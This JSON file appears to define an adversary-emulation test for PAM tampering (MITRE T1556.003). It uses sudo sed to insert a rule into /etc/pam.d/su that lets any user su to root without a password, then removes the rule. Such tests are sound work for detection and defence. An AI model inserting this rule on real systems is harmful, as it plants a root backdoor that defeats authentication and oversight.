{
  "id": "b17eacac-282d-4ca8-a240-46602cf863e3",
  "name": "Malicious PAM rule (freebsd)",
  "description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "2e37de55-5331-4ed5-826e-eb8c283d81c4",
      "type": "execute-command",
      "data": {
        "command": "sudo sed -i \"\" \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "571e94c0-fb63-451b-be2d-df7b85a07f5d",
      "type": "execute-command",
      "data": {
        "command": "sudo sed -i \"\" \"/#{pam_rule}/d\" #{path_to_pam_conf}\n",
        "command_type": "sh"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "2e37de55-5331-4ed5-826e-eb8c283d81c4",
      "p": "on-success",
      "o": "571e94c0-fb63-451b-be2d-df7b85a07f5d"
    },
    {
      "s": "2e37de55-5331-4ed5-826e-eb8c283d81c4",
      "p": "on-failure",
      "o": "571e94c0-fb63-451b-be2d-df7b85a07f5d"
    }
  ],
  "tags": [
    "T1556",
    "T1556.003"
  ],
  "input_arguments": [
    {
      "name": "pam_rule",
      "type": "string",
      "description": "Rule to add to the PAM config.",
      "value": "auth sufficient pam_succeed_if.so uid \u003e= 0"
    },
    {
      "name": "index",
      "type": "integer",
      "description": "Index where the rule is inserted.",
      "value": "8"
    },
    {
      "name": "path_to_pam_conf",
      "type": "string",
      "description": "PAM config file to modify.",
      "value": "/etc/pam.d/su"
    }
  ]
}